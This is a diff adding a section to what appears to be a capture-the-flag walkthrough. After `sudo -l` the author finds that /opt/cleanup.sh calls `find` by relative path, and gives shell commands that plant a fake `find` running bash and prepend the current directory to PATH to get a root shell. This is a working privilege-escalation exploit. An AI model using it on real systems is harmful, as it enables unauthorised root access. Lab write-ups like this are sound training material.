@@ -12,3 +12,21 @@ Inspect the POST with burp to download a PNG photo and find diferrent parametere
 
 <figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
+#### Analyze the sudo permissions
+
+`sudo -l`
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+
+We open the script and see that find is using the relative path, not the absolute. So lets crate a find command as bash and execute it as root
+
+```bash
+echo bash > find
+chmod +x find
+sudo PATH=$PWD:$PATH /opt/cleanup.sh # This add the pwd to the variable $PATH 
+id
+
+```
+
